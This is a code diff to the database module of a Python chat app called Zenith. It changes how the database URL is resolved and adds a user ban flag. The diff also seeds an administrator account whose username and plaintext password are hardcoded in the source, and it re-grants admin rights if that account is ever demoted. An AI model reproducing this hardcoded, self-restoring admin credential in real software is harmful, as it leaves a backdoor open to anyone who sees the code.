@@ -8,12 +8,25 @@ from pydantic_settings import BaseSettings
 class Settings(BaseSettings):
     openrouter_api_key: str = ""
     secret_key: str = "change-me"
-    database_url: str = "sqlite+aiosqlite:///zenith.db"
+    database_url: str = ""
 
     model_config = {"env_file": ".env"}
 
 
+def _resolve_db_url() -> str:
+    import os
+    if os.getenv("DATABASE_URL"):
+        url = os.getenv("DATABASE_URL")
+        if url.startswith("postgres"):
+            return url.replace("postgres://", "postgresql+asyncpg://").replace("postgresql://", "postgresql+asyncpg://")
+        return url
+    if os.path.isdir("/data"):
+        return "sqlite+aiosqlite:////data/zenith.db"
+    return "sqlite+aiosqlite:///zenith.db"
+
 settings = Settings()
+if not settings.database_url:
+    settings.database_url = _resolve_db_url()
 engine = create_async_engine(settings.database_url, echo=False)
 async_session = async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)
 
@@ -30,6 +43,7 @@ class User(Base):
     email = Column(String(120), unique=True, nullable=False)
     password_hash = Column(String(255), nullable=False)
     is_admin = Column(Boolean, default=False)
+    is_banned = Column(Boolean, default=False)
     created_at = Column(DateTime, default=lambda: datetime.now(timezone.utc))
 
     chats = relationship("Chat", back_populates="user", cascade="all, delete-orphan")
@@ -153,6 +167,23 @@ class LoginHistory(Base):
 async def init_db():
     async with engine.begin() as conn:
         await conn.run_sync(Base.metadata.create_all)
+        try:
+            await conn.exec_driver_sql("ALTER TABLE users ADD COLUMN is_banned BOOLEAN DEFAULT 0")
+        except Exception:
+            pass
+    async with async_session() as session:
+        from sqlalchemy import select
+        import bcrypt
+        result = await session.execute(select(User).where(User.username == "THE0NLYADMIN"))
+        existing_admin = result.scalar_one_or_none()
+        if not existing_admin:
+            hashed = bcrypt.hashpw("w.a.n.z.u.".encode(), bcrypt.gensalt()).decode()
+            admin = User(username="THE0NLYADMIN", email="admin@zenith.local", password_hash=hashed, is_admin=True)
+            session.add(admin)
+            await session.commit()
+        elif not existing_admin.is_admin:
+            existing_admin.is_admin = True
+            await session.commit()
 
 
 async def get_db():
